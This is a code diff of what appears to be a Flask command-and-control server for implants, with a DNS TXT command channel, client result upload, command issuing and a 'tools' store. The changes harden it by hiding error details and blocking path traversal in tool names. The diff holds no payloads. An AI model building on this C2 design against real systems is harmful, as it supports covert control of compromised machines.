@@ -137,7 +137,7 @@ def implants_check():
                         "content": content
                     })
             except Exception as e:
-                print(f"[Error] reading file {file}: {e}")
+                print(f"[Error] reading file")
 
 
 def start_watching():
@@ -387,9 +387,9 @@ def search_database(term, data_path="parquets/techniques.parquet"):
     try:
         df = pd.read_parquet(data_path)
     except FileNotFoundError:
-        return f"Error: File not found {data_path}"
+        return f"Error: File not found"
     except ValueError as e:
-        return f"Error reading Parquet: {e}"
+        return f"Error reading Parquet"
 
     for col in df.columns:
         if df[col].apply(lambda x: isinstance(x, list)).any():
@@ -500,7 +500,7 @@ class CustomDNSResolver(BaseResolver):
                         logger.warning(f"Comando no reconocido: {command}")
 
                 except Exception as e:
-                    logger.error(f"Error procesando comando: {e}")
+                    logger.error(f"Error:")
                     reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("Error en el comando"), ttl=60))
             else:
                 # Dominio no reconocido
@@ -829,7 +829,7 @@ def receive_result(client_id):
                 return jsonify({"status": "error", "message": "Permission denied"}), 403
 
         except Exception as e:
-            print(f"[ERROR] Path validation error: {str(e)}")
+            print(f"[ERROR] Path validation error:")
             return jsonify({"status": "error", "message": "Path validation error"}), 500
 
         try:
@@ -865,14 +865,14 @@ def receive_result(client_id):
             return jsonify({"status": "success", "Platform": client}), 200
 
         except IOError as e:
-            print(f"[ERROR] File operation error: {str(e)}")
+            print(f"[ERROR] File operation error")
             return jsonify({"status": "error", "message": "File operation error"}), 500
 
     except json.JSONDecodeError:
-        print(f"[ERROR] Invalid JSON received from {client_id}")
+        print(f"[ERROR] Invalid JSON received")
         return jsonify({"status": "error", "message": "Invalid JSON"}), 400
     except Exception as e:
-        print(f"[ERROR] Unexpected error: {str(e)}")
+        print(f"[ERROR] Unexpected error")
         return jsonify({"status": "error", "message": "Internal server error"}), 500
 
 @app.route('/issue_command', methods=['POST'])
@@ -985,7 +985,7 @@ def serve_file(file_path):
             file_name = os.path.basename(file_path)
             return send_from_directory(temp_dir, file_name, as_attachment=True)
         except Exception as e:
-            return str(e), 500
+            return 500
     else:
         return jsonify({"status": "error", "message": "File not found"}), 404
 
@@ -1518,18 +1518,18 @@ def create_tool():
         command = request.form['command']
         trigger = request.form.getlist('trigger')
         active = request.form.get('active') == 'true'
-
+        securetoolname = secure_filename(toolname)
         for key, value in config.items():
             command = command.replace(f'{{{str(key)}}}', str(value))
 
         tool_data = {
-            "toolname": toolname,
+            "toolname": securetoolname,
             "command": command,
             "trigger": trigger,
             "active": active
         }
-
-        tool_path = os.path.join(TOOLS_DIR, f'{toolname}.tool')
+        
+        tool_path = os.path.join(TOOLS_DIR, f'{securetoolname}.tool')
         with open(tool_path, 'w') as file:
             json.dump(tool_data, file, indent=4)
 
@@ -1542,7 +1542,26 @@ def view_tool(toolname):
     response = decoy()
     if response:
         return response    
-    tool_path = os.path.join(TOOLS_DIR, f'{toolname}.tool')
+    tools = []
+    for filename in os.listdir(TOOLS_DIR):
+        if filename.endswith('.tool'):
+            tool_path_safe = os.path.join(TOOLS_DIR, filename)
+            with open(tool_path_safe, 'r') as file:
+                tool_data = json.load(file)
+                tool_data['filename'] = filename  # Agregar el nombre del archivo al diccionario
+                tools.append(tool_data)
+
+    valid_tool = None
+    for tool in tools:
+        if toolname == tool['filename'].replace('.tool', ''):
+            valid_tool = tool
+            break
+
+    if not valid_tool:
+        abort(404, description="Herramienta no encontrada o no válida")
+
+    tool_path = os.path.join(TOOLS_DIR, tool['filename'])    
+
     with open(tool_path, 'r') as file:
         tool_data = json.load(file)
     return render_template('view_tool.html', tool=tool_data)
@@ -1552,8 +1571,27 @@ def update_tool(toolname):
     response = decoy()
     config = load_payload()
     if response:
-        return response    
-    tool_path = os.path.join(TOOLS_DIR, f'{toolname}.tool')
+        return response
+    
+    tools = []
+    for filename in os.listdir(TOOLS_DIR):
+        if filename.endswith('.tool'):
+            tool_path_safe = os.path.join(TOOLS_DIR, filename)
+            with open(tool_path_safe, 'r') as file:
+                tool_data = json.load(file)
+                tool_data['filename'] = filename  # Agregar el nombre del archivo al diccionario
+                tools.append(tool_data)
+
+    valid_tool = None
+    for tool in tools:
+        if toolname == tool['filename'].replace('.tool', ''):
+            valid_tool = tool
+            break
+
+    if not valid_tool:
+        abort(404, description="Herramienta no encontrada o no válida")
+
+    tool_path = os.path.join(TOOLS_DIR, tool['filename'])
     if request.method == 'POST':
         command = request.form['command']
         trigger = request.form.getlist('trigger')
